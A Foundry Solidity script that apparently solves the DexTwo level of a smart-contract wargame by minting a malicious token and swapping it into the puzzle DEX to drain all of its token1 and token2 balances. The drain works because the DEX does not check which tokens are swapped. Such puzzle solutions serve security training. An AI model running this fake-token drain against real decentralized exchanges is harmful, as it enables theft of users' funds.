// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {DevOpsTools} from "foundry-devops/src/DevOpsTools.sol";
import {MalToken} from "../../src/attackers/23/MalToken.sol";
import {DexTwo} from "../../src/puzzles/23/DexTwo.sol";
import {SwappableToken} from "../../src/puzzles/22/Dex.sol";

contract DexTwoSolution is Script {
    function run(address target) external {
        address malTokenAddress = DevOpsTools.get_most_recent_deployment("MalToken", block.chainid);
        solve(target, malTokenAddress, msg.sender);
    }

    function solve(address target, address malTokenAddress, address player) public {
        DexTwo puzzleContract = DexTwo(target);
        MalToken malToken = MalToken(malTokenAddress);
        address token1 = puzzleContract.token1();
        address token2 = puzzleContract.token2();

        vm.startBroadcast();
        malToken.mintTokensToAddress(player, 3);

        malToken.mintTokensToAddress(address(puzzleContract), 1);
        malToken.approve(address(puzzleContract), 1);
        puzzleContract.swap(address(malToken), token1, 1);

        // get all token2 from dex
        malToken.mintTokensToAddress(player, 2);
        malToken.approve(address(puzzleContract), 2);
        puzzleContract.swap(address(malToken), token2, 2);

        vm.stopBroadcast();
    }
}